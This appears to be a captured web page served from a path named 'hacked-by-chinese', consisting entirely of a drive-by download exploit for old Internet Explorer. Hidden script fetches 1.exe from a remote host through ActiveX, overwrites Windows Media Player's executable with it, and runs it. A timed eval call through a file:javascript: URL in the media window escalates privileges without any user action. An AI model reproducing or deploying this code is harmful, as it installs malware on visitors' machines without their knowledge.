Read 1550 bytes from host ip3e83566f.speed.planet.nl, path /hacked-by-chinese/5.htm
HTTP/1.1 200 OK
Server: Resin/2.1.2
ETag: "AAAANyUdYGw"
Last-Modified: Sun, 09 Jan 2000 02:05:34 GMT
Expires: Sun, 09 Jan 2000 05:30:38 GMT
Content-Type: text/html
Content-Length: 1319
Date: Sun, 09 Jan 2000 05:30:33 GMT

<textarea id="code" style="display:none;">

    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET", "http://ip3e83566f.speed.planet.nl/1.exe",0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";

</textarea>

<script language="javascript">

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
        
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");

            if (line != '') {
                result += line +'\\r\\n';
            }
        }
        return result;
    }
    
    function doit() {
        mycode = preparecode(document.all.code.value);
        myURL = "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media")    
    }
    

    window.open("error.jsp","_media");
    
    setTimeout("doit()", 5000);
    
    
</script>
